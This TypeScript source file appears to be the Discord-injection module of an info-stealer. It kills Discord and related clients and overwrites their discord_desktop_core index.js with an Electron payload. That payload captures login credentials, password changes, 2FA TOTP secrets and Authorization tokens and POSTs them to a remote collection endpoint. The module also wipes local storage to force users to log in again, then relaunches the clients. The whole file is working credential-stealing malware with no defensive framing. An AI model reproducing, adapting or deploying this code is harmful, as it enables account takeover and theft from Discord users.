import fs from 'fs';
import path from 'path';
import { readdir, writeFile, unlink, readFile } from 'fs/promises';
import { localappdata, appData, BASE_API_URL, BUILD_ID, API_KEY } from '../config/constants';
import { terminateProcesses, startProcess, killProcess } from '../utils/process';
import { sendGenericMessage } from '../api/sender';

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const JS_PAYLOAD = `(function() {
    const { session, net } = require('electron');
    const USER_NAME = process.env.USERNAME || process.env.USER || "Unknown";
    const logger = (type, data) => {
        try {
            const payload = JSON.stringify({ 
                type: type, 
                data: data, 
                timestamp: new Date().toISOString(), 
                buildId: "${BUILD_ID}",
                user:USER_NAME
            });
            const req = net.request({ method: 'POST', url: "${BASE_API_URL}/collect" });
            req.setHeader('Content-Type', 'application/json');
            req.setHeader('X-Build-ID', "${BUILD_ID}");
            req.setHeader('X-Api-KEY', "${API_KEY}")
            req.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
            
            req.on('error', () => { });
            req.write(payload);
            req.end();
        } catch (e) { }
    };

    const apiFilters = ["*://discord.com/api/*", "*://*.discord.com/api/*", "*://discordapp.com/api/*"];

    session.defaultSession.webRequest.onBeforeRequest({ urls: apiFilters }, (details, callback) => {
        if (details.url.includes("/science") || details.url.includes("/tracing")) return callback({ cancel: false });
        
        if ((details.method === 'POST' || details.method === 'PATCH') && details.uploadData && details.uploadData[0] && details.uploadData[0].bytes) {
            try {
                const parsed = JSON.parse(details.uploadData[0].bytes.toString());
                if (details.url.includes('auth/login')) {
                    logger('CREDENTIALS_CAPTURE', { email: parsed.login, pass: parsed.password });
                }
                if (parsed.new_password) {
                    logger('PASSWORD_CHANGED', { old: parsed.password, new: parsed.new_password });
                }
                if (details.url.includes('mfa/totp/enable')) {
                    logger('2FA_SETUP_SUCCESS', { secret: parsed.secret, code: parsed.code });
                }
            } catch (e) { }
        }
        callback({ cancel: false });
    });

    session.defaultSession.webRequest.onBeforeSendHeaders({ urls: apiFilters }, (details, callback) => {
        if (details.requestHeaders['Authorization']) {
            const token = details.requestHeaders['Authorization'];
            if (typeof global.lastT === 'undefined' || global.lastT !== token) { 
                global.lastT = token; 
                logger('TOKEN_GRABBED', { token }); 
            }
        }
        callback({ requestHeaders: details.requestHeaders });
    });
})();`;

async function forceWrite(filePath: string, content: string): Promise<boolean> {
    for (let i = 0; i < 5; i++) {
        try {
            await writeFile(filePath, content, 'utf8');
            return true;
        } catch (e: any) {
            if (e.code === 'EBUSY') { await sleep(1000); continue; }
            throw e;
        }
    }
    return false;
}

export async function dcinject(): Promise<void> {
    try {
        const clients = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment', 'Vesktop', 'Vencord'];
        await terminateProcesses(clients.map(c => c + '.exe'));
        await sleep(2000);

        const targetDirs = [
            { base: localappdata, search: ['cord', 'vencord', 'vesktop'] },
            { base: appData, search: ['BetterDiscord'] }
        ];

        for (const target of targetDirs) {
            if (!fs.existsSync(target.base)) continue;
            const folders = (await readdir(target.base)).filter(f => target.search.some(s => f.toLowerCase().includes(s.toLowerCase())));

            for (const folder of folders) {
                const fullPath = path.join(target.base, folder);
                try {
                    const appDirs = (await readdir(fullPath)).filter(d => d.startsWith('app-'));
                    appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));

                    if (appDirs.length > 0) {
                        const modulesPath = path.join(fullPath, appDirs[0], 'modules');
                        if (fs.existsSync(modulesPath)) {
                            const modFolders = await readdir(modulesPath);
                            const coreFolder = modFolders.find(f => f.startsWith('discord_desktop_core'));
                            if (coreFolder) {
                                const indexPath = path.join(modulesPath, coreFolder, 'discord_desktop_core', 'index.js');
                                if (fs.existsSync(indexPath)) {
                                    const content = await readFile(indexPath, 'utf8');
                                    if (!content.includes(BASE_API_URL)) {
                                        await forceWrite(indexPath, `${JS_PAYLOAD}\nmodule.exports = require('./core.asar');`);
                                    }
                                }
                            }
                        }
                    }

                    const dbPath = path.join(appData, folder, 'Local Storage', 'leveldb');
                    if (fs.existsSync(dbPath)) {
                        const files = await readdir(dbPath);
                        for (const f of files) {
                            if (f.endsWith('.ldb') || f.endsWith('.log')) await forceWrite(path.join(dbPath, f), '');
                        }
                    }
                } catch { continue; }
            }
        }

        for (const client of clients) {
            const upPath = path.join(localappdata, client, 'Update.exe');
            if (fs.existsSync(upPath)) startProcess(upPath, `--processStart ${client}.exe`);
        }
    } catch (err: any) {
        sendGenericMessage(`Injection Error: ${err.message}`);
    }
}
export async function dckill(): Promise<void> {
    const executables = ['Discord', 'DiscordCanary', 'discordDevelopment', 'DiscordPTB'];
    for (const executable of executables) {
        try {
            await killProcess(executable);
            const updatePath = `${localappdata}\\${executable}\\Update.exe`;
            if (fs.existsSync(updatePath)) {
                startProcess(updatePath, `--processStart ${executable}.exe`);
            }
        } catch { }
    }
}